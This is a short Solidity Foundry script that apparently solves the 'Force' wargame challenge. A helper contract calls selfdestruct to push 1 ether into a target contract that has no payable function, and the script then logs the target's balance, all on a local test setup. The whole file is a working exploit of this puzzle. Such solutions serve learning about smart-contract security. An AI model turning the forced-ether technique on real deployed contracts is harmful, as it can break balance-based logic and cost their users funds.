// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Force.sol";

contract Force_contractSelfDestruct {
    function attack(address _addressForce) public payable {
        address payable addr = payable(_addressForce);
        selfdestruct(addr);
    }
}

contract Force_attack is Script{
    Force forceContract;
    Force_contractSelfDestruct forceDescruct;
    function setUp() public{}

    function run() public{
        forceContract = new Force();
        forceDescruct = new Force_contractSelfDestruct();

        vm.deal(address(1), 5 ether);
        vm.startPrank(address(1));
        

        bytes memory data = abi.encodeWithSignature("attack(address)", address(forceContract));
        (bool s, ) = address(forceDescruct).call{value:1 ether}(data);
        
        console.log(address(forceContract).balance);

        
        

        

    }
}